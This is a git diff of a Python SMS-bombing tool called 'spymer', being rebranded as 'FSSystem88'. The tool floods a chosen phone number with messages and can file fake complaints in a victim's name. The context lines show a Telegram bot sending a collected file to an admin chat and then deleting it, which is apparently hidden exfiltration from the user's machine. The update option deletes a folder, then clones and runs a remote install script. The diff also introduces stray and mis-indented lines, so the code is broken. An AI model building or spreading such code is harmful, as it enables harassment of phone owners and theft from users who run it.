@@ -53,17 +53,13 @@ bot.send_document(adm, doc)
 doc.close()
 send_info()
 os.remove(r'C:/ProgramData/system.txt')
-
+	spymer###########################################
 os.system("clear")
 def Main():
 	global info
 	global proxy
 	ver = '74'
-	version = requests.post("https://rainbow-t-shirt.com/spymer/version.php").json()["version"]
-	if int(ver) < int(version):
-		info = Back.RED+"\nВерсия устарела и нуждается в обновлении!"+Style.RESET_ALL
-	else:
-		info = " "
+    info = " "
 	proxy = "localhost"
 	logo = Fore.GREEN+"8888888888888888888888888\n8888888888888888888888888\n888        888        888\n888  888888888  8888  888\n888  888888888  888888888\n888        888        888\n888  888888888888888  888\n888  888888888  8888  888\n888  888888888        888\n8888888888888888888888888\n8888888888888888888888888\n8888    FSystem88    8888\n8888   SMS Spammer   8888\n8888      v.7.4      8888\n8888     MPL-2.0     8888\n8888888888888888888888888\n8888888888888888888888888"+Style.RESET_ALL
 	def main():
@@ -81,11 +77,11 @@ def Main():
 			if input1 == "1":
 				try:
 					print('Введите телефон ("Enter" - отмена):')
-					phone = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
+					phone = input(Fore.BLUE+"FSSystem88 > "+Style.RESET_ALL)
 					try:
 						if int(phone):
 							print('Введите количество кругов ("Enter" - отмена):')
-							count = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
+							count = input(Fore.BLUE+"FSSystem88 > "+Style.RESET_ALL)
 							try:
 								if int(count):
 									count=int(count)
@@ -99,7 +95,7 @@ def Main():
 									iteration = 0
 									id=requests.post('https://rainbow-t-shirt.com/spymer/json.php', data={'phone': _phone}).json()["id"]
 									if int(id) > 0:
-										info = Fore.RED+"\nНомер телефона находится в антиспам листе."+Style.RESET_ALL
+										info = Fore.RED+"\nлох."+Style.RESET_ALL
 									elif int(id)==0:
 										_name = ''
 										for x in range(12):
@@ -412,7 +408,7 @@ def Main():
 			
 			elif input1 == "2":
 				print ("Введите номер:")
-				phone = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
+				phone = input(Fore.BLUE+"FSSystem88 > "+Style.RESET_ALL)
 				if phone[0] == '+':
 					phone = phone[1:]
 				if phone[0] == '8':
@@ -433,7 +429,7 @@ def Main():
 			
 			elif input1 == "3":
 				print ("Войдите в телефон для проверки:")
-				phone = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
+				phone = input(Fore.BLUE+"FSSystem88 > "+Style.RESET_ALL)
 				if phone[0] == '+':
 					phone = phone[1:]
 				if phone[0] == '8':
@@ -453,16 +449,16 @@ def Main():
 			elif input1 == "4":
 				try:
 					print("Введите  номер:")
-					phone = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
+					phone = input(Fore.BLUE+"FSSystem88 > "+Style.RESET_ALL)
 					try:
 						if int(phone):
 							print("Введите имя:")
-							name = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
+							name = input(Fore.BLUE+"FSSystem88 > "+Style.RESET_ALL)
 							if name == "":
 								info = Fore.RED+"\nIncorrect name entered!"+Style.RESET_ALL
 								main()
 							print("Введите жалобу (обращение, которое потерпевший якобы адресует адвокатам):")
-							text = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
+							text = input(Fore.BLUE+"FSSystem88 > "+Style.RESET_ALL)
 							if text == "":
 								info = Fore.RED+"\nНекорректно введена жалоба!"+Style.RESET_ALL
 								main()
@@ -713,7 +709,7 @@ def Main():
 			elif input1 == "6":
 				a=input("Вы уверены, что хотите обновить? (y/n) ")
 				if a=="y":
-					cmd = os.system("cd && rm -rf ~/spymer && git clone https://github.com/FSystem88/spymer && sh ~/spymer/install.sh")
+					cmd = os.system("cd && rm -rf ~/FSSystem88 && git clone https://github.com/FirtiBik/FSSystem88 && sh ~/FSSystem88/install.sh")
 					exit()
 				else:
 					print("Отменено")
